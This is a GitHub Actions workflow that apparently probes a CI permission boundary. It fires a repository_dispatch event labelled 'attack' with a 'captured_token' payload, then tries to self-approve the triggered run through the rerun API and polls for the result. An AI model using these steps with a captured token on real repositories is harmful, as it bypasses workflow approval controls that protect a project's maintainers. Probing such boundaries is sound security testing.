name: repo_dispatch_driver
on:
  workflow_dispatch:
permissions:
  contents: write
  pull-requests: write
  actions: write
jobs:
  drive:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - name: Identify
        run: |
          echo "DRIVER run=${{ github.run_id }} actor=${{ github.actor }}"

      - name: POST /dispatches with GITHUB_TOKEN
        id: rd
        run: |
          status=$(curl -s -o /tmp/d.json -w "%{http_code}" -X POST \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/dispatches" \
            -d '{"event_type":"attack","client_payload":{"src":"captured_token"}}')
          echo "REPO_DISPATCH_HTTP=$status"
          echo "REPO_DISPATCH_BODY_HEAD<<EOF"
          head -c 400 /tmp/d.json
          echo
          echo "EOF"
          echo "REPO_DISPATCH_HTTP=$status" >> $GITHUB_OUTPUT

      - name: Wait & list repository_dispatch runs
        id: runs
        run: |
          sleep 20
          curl -sS -H "Authorization: Bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs?event=repository_dispatch&per_page=10" \
            | tee /tmp/runs.json | jq '.workflow_runs[] | {id,name,status,conclusion,event,actor:.actor.login,triggering_actor:.triggering_actor.login,created_at}'
          RUN_ID=$(jq -r '[.workflow_runs[] | select(.name=="repo_dispatch_ci")] | sort_by(.created_at) | last | .id // empty' /tmp/runs.json)
          RUN_STATUS=$(jq -r --arg id "$RUN_ID" '.workflow_runs[] | select((.id|tostring)==$id) | .status' /tmp/runs.json)
          COUNT=$(jq '.workflow_runs | length' /tmp/runs.json)
          echo "REPO_DISPATCH_TOTAL_LIST=$COUNT"
          echo "REPO_DISPATCH_RUN_ID=$RUN_ID"
          echo "REPO_DISPATCH_STATUS=$RUN_STATUS"
          echo "RUN_ID=$RUN_ID" >> $GITHUB_OUTPUT
          echo "RUN_STATUS=$RUN_STATUS" >> $GITHUB_OUTPUT

      - name: ABSENT result
        if: steps.runs.outputs.RUN_ID == '' || steps.runs.outputs.RUN_ID == 'null'
        run: |
          echo "RESULT=REPO_DISPATCH_CI_ABSENT — repository_dispatch from GITHUB_TOKEN did not create a run"

      - name: Self-approve if action_required (/rerun)
        if: steps.runs.outputs.RUN_ID != '' && steps.runs.outputs.RUN_ID != 'null'
        run: |
          status=$(curl -s -o /tmp/rerun.json -w "%{http_code}" -X POST \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ steps.runs.outputs.RUN_ID }}/rerun")
          echo "RERUN_HTTP=$status"
          echo "RERUN_BODY<<EOF"
          cat /tmp/rerun.json
          echo "EOF"

      - name: Poll
        if: steps.runs.outputs.RUN_ID != '' && steps.runs.outputs.RUN_ID != 'null'
        run: |
          for i in $(seq 1 20); do
            R=$(curl -sS -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
              "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ steps.runs.outputs.RUN_ID }}")
            S=$(echo "$R" | jq -r '.status')
            C=$(echo "$R" | jq -r '.conclusion')
            echo "POLL i=$i status=$S conclusion=$C"
            if [ "$S" = "completed" ]; then break; fi
            sleep 10
          done

      - name: Final
        if: steps.runs.outputs.RUN_ID != '' && steps.runs.outputs.RUN_ID != 'null'
        run: |
          curl -sS -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ steps.runs.outputs.RUN_ID }}" \
            | jq '{id,name,status,conclusion,event,actor:.actor.login,triggering_actor:.triggering_actor.login}'
